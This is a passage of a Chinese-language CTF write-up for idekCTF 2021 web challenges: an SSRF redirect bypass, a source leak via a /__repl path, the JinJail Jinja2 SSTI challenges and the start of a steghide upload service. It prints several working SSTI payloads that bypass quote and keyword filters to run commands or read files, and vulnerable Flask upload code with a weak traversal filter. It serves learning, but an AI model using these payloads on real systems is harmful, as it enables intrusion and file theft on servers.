+<span style=color:#00a8c8>if</span> <span style=color:#111>__name__</span> <span style=color:#f92672>==</span> <span style=color:#d88200>&#39;__main__&#39;</span><span style=color:#111>:</span>
+    <span style=color:#111>Thread</span><span style=color:#111>(</span><span style=color:#111>target</span><span style=color:#f92672>=</span><span style=color:#111>start_server</span><span style=color:#111>)</span><span style=color:#f92672>.</span><span style=color:#111>start</span><span style=color:#111>()</span>
+    <span style=color:#111>Thread</span><span style=color:#111>(</span><span style=color:#111>target</span><span style=color:#f92672>=</span><span style=color:#111>send_payload</span><span style=color:#111>)</span><span style=color:#f92672>.</span><span style=color:#111>start</span><span style=color:#111>()</span>
+
+</code></pre></div><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211213132943376.png alt=image-20211213132943376></p>
+<p><code>idek{d1ff3r3nc3_ch3ck3r_d3ce1v3d_bY_d1ff3r3nc3s}</code></p>
+<p>使用重定向的方式，避开ssrfFilter的过滤，学到了</p>
+<h2 id=sourceless-guessy-web>Sourceless Guessy Web</h2>
+<blockquote>
+<p>&ldquo;If it has a website its web&rdquo;</p>
+<p><a href=https://sgw.chal.imaginaryctf.org/>https://sgw.chal.imaginaryctf.org/</a></p>
+</blockquote>
+<p>首页上没东西，就两行字</p>
+<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211212015231115.png alt=image-20211212015231115></p>
+<p>而且也不能爆破，尝试了经典路由都没什么反应，看审查元素</p>
+<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211213135213779.png alt=image-20211213135213779></p>
+<p>抓包会看到响应头一直带着<code>report-uri="https://sentry.repl.it/api/10/security/?sentry_key=xxxx</code>这样的东西，访问<code>https://sgw.chal.imaginaryctf.org/__repl</code>就会看到源码了</p>
+<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211213234458242.png alt=image-20211213234458242></p>
+<p><code>idek{why_do_people_keep_st0ring_secrets_0n_replit_w1th0ut_3nv}</code></p>
+<h2 id=jinjailbaby-jinjail>JinJail&Baby JinJail</h2>
+<blockquote>
+<p>I&rsquo;ve looked all over the internet for payloads or techniques to bypass my SSTI filter, but none would work! Surely this is secure?</p>
+<p><a href=http://jinjail.chal.idek.team>http://jinjail.chal.idek.team</a> | <a href=https://ctf.idek.team/handouts/web/JinJail/jinjail-dist.zip>https://ctf.idek.team/handouts/web/JinJail/jinjail-dist.zip</a></p>
+</blockquote>
+<blockquote>
+<p>Jinjail was a bit harder than anticipated, so here&rsquo;s a baby version without the character limit to familiarize yourself with some jinja2 SSTI techniques!</p>
+<p><a href=http://baby-jinjail.chal.idek.team>http://baby-jinjail.chal.idek.team</a> | <a href=https://ctf.idek.team/handouts/web/BabyJinJail/baby-jinjail-dist.zip>https://ctf.idek.team/handouts/web/BabyJinJail/baby-jinjail-dist.zip</a></p>
+</blockquote>
+<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211213165127940.png alt=image-20211213165127940></p>
+<p>（这个图里注释有一些不对的地方 懒得改了</p>
+<p>构造卡到我的地方是禁用了单双引号，一般情况下过滤引号可以使用<code>chr()</code>来表示字符，但是这个方法有需要用到数字；我们现在需要的是一个纯字母的SSTI payload</p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#75715e># official payload</span>
+<span style=color:#111>{{</span><span style=color:#111>lipsum</span><span style=color:#111>[(</span><span style=color:#111>dict</span><span style=color:#111>(</span><span style=color:#111>__globals__</span><span style=color:#f92672>=</span><span style=color:#111>x</span><span style=color:#111>)</span><span style=color:#f92672>|</span><span style=color:#111>list</span><span style=color:#111>)[</span><span style=color:#00a8c8>False</span><span style=color:#111>]][(</span><span style=color:#111>dict</span><span style=color:#111>(</span><span style=color:#111>os</span><span style=color:#f92672>=</span><span style=color:#111>x</span><span style=color:#111>)</span><span style=color:#f92672>|</span><span style=color:#111>list</span><span style=color:#111>)[</span><span style=color:#00a8c8>False</span><span style=color:#111>]][(</span><span style=color:#111>dict</span><span style=color:#111>(</span><span style=color:#111>popen</span><span style=color:#f92672>=</span><span style=color:#111>x</span><span style=color:#111>)</span><span style=color:#f92672>|</span><span style=color:#111>list</span><span style=color:#111>)[</span><span style=color:#00a8c8>False</span><span style=color:#111>]]([(</span><span style=color:#111>dict</span><span style=color:#111>(</span><span style=color:#111>cat</span><span style=color:#f92672>=</span><span style=color:#111>x</span><span style=color:#111>)</span><span style=color:#f92672>|</span><span style=color:#111>list</span><span style=color:#111>)[</span><span style=color:#00a8c8>False</span><span style=color:#111>]</span><span style=color:#f92672>|</span><span style=color:#111>center</span><span style=color:#111>,(</span><span style=color:#111>dict</span><span style=color:#111>(</span><span style=color:#111>galf</span><span style=color:#f92672>=</span><span style=color:#111>x</span><span style=color:#111>)</span><span style=color:#f92672>|</span><span style=color:#111>list</span><span style=color:#111>)[</span><span style=color:#00a8c8>False</span><span style=color:#111>]</span><span style=color:#f92672>|</span><span style=color:#111>reverse</span><span style=color:#111>]</span><span style=color:#f92672>|</span><span style=color:#111>join</span><span style=color:#111>)[(</span><span style=color:#111>dict</span><span style=color:#111>(</span><span style=color:#111>daer</span><span style=color:#f92672>=</span><span style=color:#111>x</span><span style=color:#111>)</span><span style=color:#f92672>|</span><span style=color:#111>list</span><span style=color:#111>)[</span><span style=color:#00a8c8>False</span><span style=color:#111>]</span><span style=color:#f92672>|</span><span style=color:#111>reverse</span><span style=color:#111>]()}}</span>
+</code></pre></div><p><code>lipsum</code>跟<code>url_for</code>, <code>get_flashed_messages</code>一样是一个在flask中的内置函数，比如<code>url_for</code>可以这样用</p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#111>{{</span><span style=color:#111>url_for</span><span style=color:#f92672>.</span><span style=color:#111>__init__</span><span style=color:#111>}}</span>
+</code></pre></div><p>对于关键字的过滤使用了<code>(dict()|list)[False]</code>的方式进行一个绕过，但是说实话我并不清楚这个<code>False</code>的用意是什么，如果不带<code>False</code>或用了<code>True</code>返回的结果都是空的，我也没有查到相关的资料（如果有带师傅看到了请务必指教！！！</p>
+<p>还有从discord里看到的其它版本的payload，也是用到了各种各样的过滤器</p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#111>{{(</span><span style=color:#111>dict</span><span style=color:#111>(</span><span style=color:#111>a</span><span style=color:#f92672>=</span><span style=color:#111>x</span><span style=color:#111>)</span><span style=color:#f92672>|</span><span style=color:#111>last</span><span style=color:#111>)[</span><span style=color:#111>dict</span><span style=color:#111>(</span><span style=color:#111>__cl</span><span style=color:#f92672>=</span><span style=color:#111>x</span><span style=color:#111>,</span><span style=color:#111>ass__</span><span style=color:#f92672>=</span><span style=color:#111>x</span><span style=color:#111>)</span><span style=color:#f92672>|</span><span style=color:#111>join</span><span style=color:#111>][</span><span style=color:#111>dict</span><span style=color:#111>(</span><span style=color:#111>__mro__</span><span style=color:#f92672>=</span><span style=color:#111>x</span><span style=color:#111>)</span><span style=color:#f92672>|</span><span style=color:#111>last</span><span style=color:#111>][</span><span style=color:#111>dict</span><span style=color:#111>(</span><span style=color:#111>a</span><span style=color:#f92672>=</span><span style=color:#111>x</span><span style=color:#111>)</span><span style=color:#f92672>|</span><span style=color:#111>last</span><span style=color:#f92672>|</span><span style=color:#111>count</span><span style=color:#111>][</span><span style=color:#111>dict</span><span style=color:#111>(</span><span style=color:#111>__subcl</span><span style=color:#f92672>=</span><span style=color:#111>x</span><span style=color:#111>,</span><span style=color:#111>asses__</span><span style=color:#f92672>=</span><span style=color:#111>x</span><span style=color:#111>)</span><span style=color:#f92672>|</span><span style=color:#111>join</span><span style=color:#111>]()[</span><span style=color:#111>dict</span><span style=color:#111>(</span><span style=color:#111>gc</span><span style=color:#f92672>=</span><span style=color:#111>x</span><span style=color:#111>)</span><span style=color:#f92672>|</span><span style=color:#111>last</span><span style=color:#f92672>|</span><span style=color:#111>int</span><span style=color:#111>(</span><span style=color:#111>base</span><span style=color:#f92672>=</span><span style=color:#111>(</span><span style=color:#111>dict</span><span style=color:#111>(</span><span style=color:#111>aaaaaaaaaaaaaaaaaa</span><span style=color:#f92672>=</span><span style=color:#111>x</span><span style=color:#111>)</span><span style=color:#f92672>|</span><span style=color:#111>last</span><span style=color:#f92672>|</span><span style=color:#111>count</span><span style=color:#111>))]()[</span><span style=color:#111>dict</span><span style=color:#111>(</span><span style=color:#111>open</span><span style=color:#f92672>=</span><span style=color:#111>x</span><span style=color:#111>)</span><span style=color:#f92672>|</span><span style=color:#111>last</span><span style=color:#111>](</span><span style=color:#111>dict</span><span style=color:#111>(</span><span style=color:#111>fl</span><span style=color:#f92672>=</span><span style=color:#111>x</span><span style=color:#111>,</span><span style=color:#111>ag</span><span style=color:#f92672>=</span><span style=color:#111>x</span><span style=color:#111>)</span><span style=color:#f92672>|</span><span style=color:#111>join</span><span style=color:#111>)[</span><span style=color:#111>dict</span><span style=color:#111>(</span><span style=color:#111>read</span><span style=color:#f92672>=</span><span style=color:#111>x</span><span style=color:#111>)</span><span style=color:#f92672>|</span><span style=color:#111>last</span><span style=color:#111>]()}}</span>
+</code></pre></div><p>如果搭配上<code>dict()</code>这样的用法也是可以接<code>|attr()</code>的，上面我写的注释并没有考虑到这一点，我的（因为做题的时候还不清楚这些奇妙的过滤器操作，学到咯</p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#111>{{((((</span><span style=color:#111>dict</span><span style=color:#f92672>|</span><span style=color:#111>attr</span><span style=color:#111>(</span><span style=color:#111>dict</span><span style=color:#111>(</span><span style=color:#111>__mro__</span><span style=color:#f92672>=</span><span style=color:#111>x</span><span style=color:#111>)</span><span style=color:#f92672>|</span><span style=color:#111>first</span><span style=color:#111>))</span><span style=color:#f92672>|</span><span style=color:#111>last</span><span style=color:#f92672>|</span><span style=color:#111>attr</span><span style=color:#111>(</span><span style=color:#111>dict</span><span style=color:#111>(</span><span style=color:#111>__subclas</span><span style=color:#f92672>=</span><span style=color:#111>x</span><span style=color:#111>)</span><span style=color:#f92672>|</span><span style=color:#111>first</span><span style=color:#f92672>%</span><span style=color:#ae81ff>2</span><span style=color:#111>bdict</span><span style=color:#111>(</span><span style=color:#111>ses__</span><span style=color:#f92672>=</span><span style=color:#111>x</span><span style=color:#111>)</span><span style=color:#f92672>|</span><span style=color:#111>first</span><span style=color:#111>)()))[([</span><span style=color:#111>a</span><span style=color:#111>,</span><span style=color:#111>a</span><span style=color:#111>,</span><span style=color:#111>a</span><span style=color:#111>,</span><span style=color:#111>a</span><span style=color:#111>]</span><span style=color:#f92672>|</span><span style=color:#111>length</span><span style=color:#f92672>|</span><span style=color:#111>string</span><span style=color:#f92672>%</span><span style=color:#ae81ff>2</span><span style=color:#111>b</span><span style=color:#111>[</span><span style=color:#111>a</span><span style=color:#111>,</span><span style=color:#111>a</span><span style=color:#111>]</span><span style=color:#f92672>|</span><span style=color:#111>length</span><span style=color:#f92672>|</span><span style=color:#111>string</span><span style=color:#f92672>%</span><span style=color:#ae81ff>2</span><span style=color:#111>b</span><span style=color:#111>[</span><span style=color:#111>a</span><span style=color:#111>,</span><span style=color:#111>a</span><span style=color:#111>,</span><span style=color:#111>a</span><span style=color:#111>]</span><span style=color:#f92672>|</span><span style=color:#111>length</span><span style=color:#f92672>|</span><span style=color:#111>string</span><span style=color:#111>)</span><span style=color:#f92672>|</span><span style=color:#111>int</span><span style=color:#111>])(</span><span style=color:#111>dict</span><span style=color:#111>(</span><span style=color:#111>fla</span><span style=color:#f92672>=</span><span style=color:#111>x</span><span style=color:#111>)</span><span style=color:#f92672>|</span><span style=color:#111>first</span><span style=color:#f92672>%</span><span style=color:#ae81ff>2</span><span style=color:#111>bdict</span><span style=color:#111>(</span><span style=color:#111>g</span><span style=color:#f92672>=</span><span style=color:#111>x</span><span style=color:#111>)</span><span style=color:#f92672>|</span><span style=color:#111>first</span><span style=color:#111>)</span><span style=color:#f92672>|</span><span style=color:#111>attr</span><span style=color:#111>(</span><span style=color:#111>dict</span><span style=color:#111>(</span><span style=color:#111>read</span><span style=color:#f92672>=</span><span style=color:#111>_x</span><span style=color:#111>)</span><span style=color:#f92672>|</span><span style=color:#111>first</span><span style=color:#111>)()}}</span>
+</code></pre></div><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211213140710659.png alt=image-20211213140710659></p>
+<p><code>idek{us1nG_f1lt3rs_t0_byP4s5_f1lt3r5}</code></p>
+<h2 id=steghide-as-a-service>steghide-as-a-service</h2>
+<blockquote>
+<p>As has long been demonstrated by CTF, only the most 1337 are capable of running steghide. To help bridge this immense skill gap, I created a web based tool for easy embedding of hidden messages.</p>
+<p><a href=http://steghide-as-a-service.chal.idek.team/>http://steghide-as-a-service.chal.idek.team/</a> | <a href=https://ctf.idek.team/handouts/web/SteghideAsAService/saas-dist.zip>https://ctf.idek.team/handouts/web/SteghideAsAService/saas-dist.zip</a></p>
+</blockquote>
+<p>跟php的不一样（一般要绕waf拿一个webshell），flask的文件上传考点一般在其他地方，比如一些tricks&SSTI&Cookie伪造这种的，这个题也不例外，是一个LFI</p>
+<p>先审一下代码</p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#75715e># app.py</span>
+<span style=color:#f92672>from</span> <span style=color:#111>flask</span> <span style=color:#f92672>import</span> <span style=color:#111>Flask</span><span style=color:#111>,</span> <span style=color:#111>request</span><span style=color:#111>,</span> <span style=color:#111>render_template</span><span style=color:#111>,</span> <span style=color:#111>make_response</span><span style=color:#111>,</span> <span style=color:#111>redirect</span><span style=color:#111>,</span> <span style=color:#111>send_file</span>
+<span style=color:#f92672>import</span> <span style=color:#111>imghdr</span>
+<span style=color:#f92672>from</span> <span style=color:#111>imghdr</span> <span style=color:#f92672>import</span> <span style=color:#111>tests</span>
+<span style=color:#f92672>import</span> <span style=color:#111>hashlib</span>
+<span style=color:#f92672>from</span> <span style=color:#111>util</span> <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
+
+<span style=color:#75715e># https://stackoverflow.com/questions/36870661/imghdr-python-cant-detec-type-of-some-images-image-extension</span>
+<span style=color:#75715e># there are no bugs here. just patching imghdr</span>
+<span style=color:#111>JPEG_MARK</span> <span style=color:#f92672>=</span> <span style=color:#d88200>b</span><span style=color:#d88200>&#39;</span><span style=color:#8045ff>\xff\xd8\xff\xdb\x00</span><span style=color:#d88200>C</span><span style=color:#8045ff>\x00\x08\x06\x06</span><span style=color:#d88200>&#39;</span> \
+            <span style=color:#d88200>b</span><span style=color:#d88200>&#39;</span><span style=color:#8045ff>\x07\x06\x05\x08\x07\x07\x07\t\t\x08\n\x0c\x14\r\x0c\x0b\x0b\x0c\x19\x12\x13\x0f</span><span style=color:#d88200>&#39;</span>
+
+<span style=color:#00a8c8>def</span> <span style=color:#75af00>test_jpeg1</span><span style=color:#111>(</span><span style=color:#111>h</span><span style=color:#111>,</span> <span style=color:#111>f</span><span style=color:#111>):</span>
+    <span style=color:#d88200>&#34;&#34;&#34;JPEG data in JFIF format&#34;&#34;&#34;</span>
+    <span style=color:#00a8c8>if</span> <span style=color:#d88200>b</span><span style=color:#d88200>&#39;JFIF&#39;</span> <span style=color:#f92672>in</span> <span style=color:#111>h</span><span style=color:#111>[:</span><span style=color:#ae81ff>23</span><span style=color:#111>]:</span>
+        <span style=color:#00a8c8>return</span> <span style=color:#d88200>&#39;jpeg&#39;</span>
+
+<span style=color:#00a8c8>def</span> <span style=color:#75af00>test_jpeg2</span><span style=color:#111>(</span><span style=color:#111>h</span><span style=color:#111>,</span> <span style=color:#111>f</span><span style=color:#111>):</span>
+    <span style=color:#d88200>&#34;&#34;&#34;JPEG with small header&#34;&#34;&#34;</span>
+    <span style=color:#00a8c8>if</span> <span style=color:#111>len</span><span style=color:#111>(</span><span style=color:#111>h</span><span style=color:#111>)</span> <span style=color:#f92672>&gt;=</span> <span style=color:#ae81ff>32</span> <span style=color:#f92672>and</span> <span style=color:#ae81ff>67</span> <span style=color:#f92672>==</span> <span style=color:#111>h</span><span style=color:#111>[</span><span style=color:#ae81ff>5</span><span style=color:#111>]</span> <span style=color:#f92672>and</span> <span style=color:#111>h</span><span style=color:#111>[:</span><span style=color:#ae81ff>32</span><span style=color:#111>]</span> <span style=color:#f92672>==</span> <span style=color:#111>JPEG_MARK</span><span style=color:#111>:</span>
+        <span style=color:#00a8c8>return</span> <span style=color:#d88200>&#39;jpeg&#39;</span>
+
+
+<span style=color:#00a8c8>def</span> <span style=color:#75af00>test_jpeg3</span><span style=color:#111>(</span><span style=color:#111>h</span><span style=color:#111>,</span> <span style=color:#111>f</span><span style=color:#111>):</span>
+    <span style=color:#d88200>&#34;&#34;&#34;JPEG data in JFIF or Exif format&#34;&#34;&#34;</span>
+    <span style=color:#00a8c8>if</span> <span style=color:#111>h</span><span style=color:#111>[</span><span style=color:#ae81ff>6</span><span style=color:#111>:</span><span style=color:#ae81ff>10</span><span style=color:#111>]</span> <span style=color:#f92672>in</span> <span style=color:#111>(</span><span style=color:#d88200>b</span><span style=color:#d88200>&#39;JFIF&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>b</span><span style=color:#d88200>&#39;Exif&#39;</span><span style=color:#111>)</span> <span style=color:#f92672>or</span> <span style=color:#111>h</span><span style=color:#111>[:</span><span style=color:#ae81ff>2</span><span style=color:#111>]</span> <span style=color:#f92672>==</span> <span style=color:#d88200>b</span><span style=color:#d88200>&#39;</span><span style=color:#8045ff>\xff\xd8</span><span style=color:#d88200>&#39;</span><span style=color:#111>:</span>
+        <span style=color:#00a8c8>return</span> <span style=color:#d88200>&#39;jpeg&#39;</span>
+
+<span style=color:#111>tests</span><span style=color:#f92672>.</span><span style=color:#111>append</span><span style=color:#111>(</span><span style=color:#111>test_jpeg1</span><span style=color:#111>)</span>
+<span style=color:#111>tests</span><span style=color:#f92672>.</span><span style=color:#111>append</span><span style=color:#111>(</span><span style=color:#111>test_jpeg2</span><span style=color:#111>)</span>
+<span style=color:#111>tests</span><span style=color:#f92672>.</span><span style=color:#111>append</span><span style=color:#111>(</span><span style=color:#111>test_jpeg3</span><span style=color:#111>)</span>
+
+
+<span style=color:#00a8c8>def</span> <span style=color:#75af00>verify_jpeg</span><span style=color:#111>(</span><span style=color:#111>file_path</span><span style=color:#111>):</span>
+    <span style=color:#00a8c8>try</span><span style=color:#111>:</span>
+        <span style=color:#111>jpeg</span> <span style=color:#f92672>=</span> <span style=color:#111>Image</span><span style=color:#f92672>.</span><span style=color:#111>open</span><span style=color:#111>(</span><span style=color:#111>file_path</span><span style=color:#111>)</span>
+        <span style=color:#111>jpeg</span><span style=color:#f92672>.</span><span style=color:#111>verify</span><span style=color:#111>()</span>
+        <span style=color:#00a8c8>if</span> <span style=color:#111>imghdr</span><span style=color:#f92672>.</span><span style=color:#111>what</span><span style=color:#111>(</span><span style=color:#111>file_path</span><span style=color:#111>)</span> <span style=color:#f92672>!=</span> <span style=color:#d88200>&#39;jpeg&#39;</span><span style=color:#111>:</span>
+            <span style=color:#00a8c8>return</span> <span style=color:#00a8c8>False</span>
+        <span style=color:#00a8c8>return</span> <span style=color:#00a8c8>True</span>
+    <span style=color:#00a8c8>except</span><span style=color:#111>:</span>
+        <span style=color:#00a8c8>return</span> <span style=color:#00a8c8>False</span>
+
+
+<span style=color:#111>app</span> <span style=color:#f92672>=</span> <span style=color:#111>Flask</span><span style=color:#111>(</span><span style=color:#111>__name__</span><span style=color:#111>)</span>
+<span style=color:#111>app</span><span style=color:#f92672>.</span><span style=color:#111>config</span><span style=color:#111>[</span><span style=color:#d88200>&#39;MAX_CONTENT_LENGTH&#39;</span><span style=color:#111>]</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>2</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>1024</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>1024</span>
+
+<span style=color:#75af00>@app</span><span style=color:#f92672>.</span><span style=color:#111>route</span><span style=color:#111>(</span><span style=color:#d88200>&#39;/&#39;</span><span style=color:#111>)</span>
+<span style=color:#00a8c8>def</span> <span style=color:#75af00>index</span><span style=color:#111>():</span>
+    <span style=color:#111>resp</span> <span style=color:#f92672>=</span> <span style=color:#111>make_response</span><span style=color:#111>(</span><span style=color:#111>render_template</span><span style=color:#111>(</span><span style=color:#d88200>&#39;upload.html&#39;</span><span style=color:#111>))</span>
+    <span style=color:#00a8c8>if</span> <span style=color:#f92672>not</span> <span style=color:#111>request</span><span style=color:#f92672>.</span><span style=color:#111>cookies</span><span style=color:#f92672>.</span><span style=color:#111>get</span><span style=color:#111>(</span><span style=color:#d88200>&#39;session&#39;</span><span style=color:#111>):</span>
+        <span style=color:#111>resp</span><span style=color:#f92672>.</span><span style=color:#111>set_cookie</span><span style=color:#111>(</span><span style=color:#d88200>&#39;session&#39;</span><span style=color:#111>,</span> <span style=color:#111>create_token</span><span style=color:#111>())</span>
+    <span style=color:#00a8c8>return</span> <span style=color:#111>resp</span>
+
+<span style=color:#75af00>@app</span><span style=color:#f92672>.</span><span style=color:#111>route</span><span style=color:#111>(</span><span style=color:#d88200>&#39;/upload&#39;</span><span style=color:#111>,</span> <span style=color:#111>methods</span><span style=color:#f92672>=</span><span style=color:#111>[</span><span style=color:#d88200>&#39;POST&#39;</span><span style=color:#111>])</span>
+<span style=color:#00a8c8>def</span> <span style=color:#75af00>upload</span><span style=color:#111>():</span>
+    <span style=color:#00a8c8>if</span> <span style=color:#f92672>not</span> <span style=color:#111>request</span><span style=color:#f92672>.</span><span style=color:#111>cookies</span><span style=color:#f92672>.</span><span style=color:#111>get</span><span style=color:#111>(</span><span style=color:#d88200>&#39;session&#39;</span><span style=color:#111>):</span>
+        <span style=color:#00a8c8>return</span> <span style=color:#111>redirect</span><span style=color:#111>(</span><span style=color:#d88200>&#39;/&#39;</span><span style=color:#111>)</span>
+    <span style=color:#111>session</span> <span style=color:#f92672>=</span> <span style=color:#111>request</span><span style=color:#f92672>.</span><span style=color:#111>cookies</span><span style=color:#f92672>.</span><span style=color:#111>get</span><span style=color:#111>(</span><span style=color:#d88200>&#39;session&#39;</span><span style=color:#111>)</span>
+    <span style=color:#111>uploaded_file</span> <span style=color:#f92672>=</span> <span style=color:#111>request</span><span style=color:#f92672>.</span><span style=color:#111>files</span><span style=color:#111>[</span><span style=color:#d88200>&#39;file&#39;</span><span style=color:#111>]</span>
+    <span style=color:#111>password</span> <span style=color:#f92672>=</span> <span style=color:#111>request</span><span style=color:#f92672>.</span><span style=color:#111>form</span><span style=color:#111>[</span><span style=color:#d88200>&#39;password&#39;</span><span style=color:#111>]</span>
+    <span style=color:#111>content</span> <span style=color:#f92672>=</span> <span style=color:#111>request</span><span style=color:#f92672>.</span><span style=color:#111>form</span><span style=color:#111>[</span><span style=color:#d88200>&#39;content&#39;</span><span style=color:#111>]</span>
+    <span style=color:#111>upload_name</span> <span style=color:#f92672>=</span> <span style=color:#111>uploaded_file</span><span style=color:#f92672>.</span><span style=color:#111>filename</span><span style=color:#f92672>.</span><span style=color:#111>replace</span><span style=color:#111>(</span><span style=color:#d88200>&#39;../&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;&#39;</span><span style=color:#111>)</span> <span style=color:#75715e># no traversal!</span>
+    <span style=color:#111>output_name</span> <span style=color:#f92672>=</span> <span style=color:#111>os</span><span style=color:#f92672>.</span><span style=color:#111>path</span><span style=color:#f92672>.</span><span style=color:#111>join</span><span style=color:#111>(</span><span style=color:#d88200>&#39;output/&#39;</span><span style=color:#111>,</span> <span style=color:#111>os</span><span style=color:#f92672>.</span><span style=color:#111>path</span><span style=color:#f92672>.</span><span style=color:#111>basename</span><span style=color:#111>(</span><span style=color:#111>upload_name</span><span style=color:#111>))</span>
+    <span style=color:#111>image_data</span> <span style=color:#f92672>=</span> <span style=color:#111>uploaded_file</span><span style=color:#f92672>.</span><span style=color:#111>stream</span><span style=color:#f92672>.</span><span style=color:#111>read</span><span style=color:#111>()</span>
+    <span style=color:#111>image_md5</span> <span style=color:#f92672>=</span> <span style=color:#111>hashlib</span><span style=color:#f92672>.</span><span style=color:#111>md5</span><span style=color:#111>(</span><span style=color:#111>image_data</span><span style=color:#111>)</span><span style=color:#f92672>.</span><span style=color:#111>hexdigest</span><span style=color:#111>()</span>
+    <span style=color:#111>image_path</span> <span style=color:#f92672>=</span> <span style=color:#d88200>f</span><span style=color:#d88200>&#39;uploads/</span><span style=color:#d88200>{</span><span style=color:#111>image_md5</span><span style=color:#d88200>}</span><span style=color:#d88200>.jpeg&#39;</span>
+    <span style=color:#111>content_path</span> <span style=color:#f92672>=</span> <span style=color:#d88200>f</span><span style=color:#d88200>&#34;uploads/</span><span style=color:#d88200>{</span><span style=color:#111>rand_string</span><span style=color:#111>()</span><span style=color:#d88200>}</span><span style=color:#d88200>.txt&#34;</span>
+
+    <span style=color:#75715e># write temp txt file</span>
+    <span style=color:#00a8c8>with</span> <span style=color:#111>open</span><span style=color:#111>(</span><span style=color:#111>content_path</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;w&#39;</span><span style=color:#111>)</span> <span style=color:#00a8c8>as</span> <span style=color:#111>f</span><span style=color:#111>:</span>
+        <span style=color:#111>f</span><span style=color:#f92672>.</span><span style=color:#111>write</span><span style=color:#111>(</span><span style=color:#111>content</span><span style=color:#111>)</span>
+        <span style=color:#111>f</span><span style=color:#f92672>.</span><span style=color:#111>close</span><span style=color:#111>()</span>
+
+    <span style=color:#75715e># write temp image file</span>
+    <span style=color:#00a8c8>with</span> <span style=color:#111>open</span><span style=color:#111>(</span><span style=color:#111>image_path</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;wb&#39;</span><span style=color:#111>)</span> <span style=color:#00a8c8>as</span> <span style=color:#111>f</span><span style=color:#111>:</span>
+        <span style=color:#111>f</span><span style=color:#f92672>.</span><span style=color:#111>write</span><span style=color:#111>(</span><span style=color:#111>image_data</span><span style=color:#111>)</span>
+        <span style=color:#111>f</span><span style=color:#f92672>.</span><span style=color:#111>close</span><span style=color:#111>()</span>
+
+    <span style=color:#75715e># verify jpeg validity</span>
+    <span style=color:#00a8c8>if</span> <span style=color:#f92672>not</span> <span style=color:#111>verify_jpeg</span><span style=color:#111>(</span><span style=color:#111>image_path</span><span style=color:#111>):</span>
+        <span style=color:#00a8c8>return</span> <span style=color:#d88200>&#39;File is not a valid JPEG!&#39;</span><span style=color:#111>,</span> <span style=color:#ae81ff>400</span>
+
+    <span style=color:#75715e># verify session before using it</span>
+    <span style=color:#111>session</span> <span style=color:#f92672>=</span> <span style=color:#111>verify_token</span><span style=color:#111>(</span><span style=color:#111>session</span><span style=color:#111>)</span>
+    <span style=color:#00a8c8>if</span> <span style=color:#f92672>not</span> <span style=color:#111>session</span><span style=color:#111>:</span>
+        <span style=color:#00a8c8>return</span> <span style=color:#d88200>&#39;Session token invalid!&#39;</span><span style=color:#111>,</span> <span style=color:#ae81ff>400</span>
+
+    <span style=color:#75715e># attempt to embed message in image</span>
+    <span style=color:#00a8c8>try</span><span style=color:#111>:</span>
+        <span style=color:#111>embed_file</span><span style=color:#111>(</span><span style=color:#111>content_path</span><span style=color:#111>,</span> <span style=color:#111>image_path</span><span style=color:#111>,</span> <span style=color:#111>output_name</span><span style=color:#111>,</span> <span style=color:#111>password</span><span style=color:#111>)</span>
+    <span style=color:#00a8c8>except</span><span style=color:#111>:</span>
+        <span style=color:#00a8c8>return</span> <span style=color:#d88200>&#39;Embedding failed!&#39;</span><span style=color:#111>,</span> <span style=color:#ae81ff>400</span>
+
+    <span style=color:#75715e># append username to output path to prevent vulns</span>
+    <span style=color:#111>sanitized_path</span> <span style=color:#f92672>=</span> <span style=color:#d88200>f</span><span style=color:#d88200>&#39;output/</span><span style=color:#d88200>{</span><span style=color:#111>upload_name</span><span style=color:#d88200>}</span><span style=color:#d88200>_</span><span style=color:#d88200>{</span><span style=color:#111>session</span><span style=color:#111>[</span><span style=color:#d88200>&#34;username&#34;</span><span style=color:#111>]</span><span style=color:#d88200>}</span><span style=color:#d88200>&#39;</span>
+    <span style=color:#00a8c8>try</span><span style=color:#111>:</span>
+        <span style=color:#00a8c8>if</span> <span style=color:#f92672>not</span> <span style=color:#111>os</span><span style=color:#f92672>.</span><span style=color:#111>path</span><span style=color:#f92672>.</span><span style=color:#111>exists</span><span style=color:#111>(</span><span style=color:#111>sanitized_path</span><span style=color:#111>):</span>
+            <span style=color:#111>os</span><span style=color:#f92672>.</span><span style=color:#111>rename</span><span style=color:#111>(</span><span style=color:#111>output_name</span><span style=color:#111>,</span> <span style=color:#111>sanitized_path</span><span style=color:#111>)</span>
+    <span style=color:#00a8c8>except</span><span style=color:#111>:</span>
+        <span style=color:#00a8c8>pass</span>
+    <span style=color:#00a8c8>try</span><span style=color:#111>:</span>
+        <span style=color:#00a8c8>return</span> <span style=color:#111>send_file</span><span style=color:#111>(</span><span style=color:#111>sanitized_path</span><span style=color:#111>)</span>
+    <span style=color:#00a8c8>except</span><span style=color:#111>:</span>
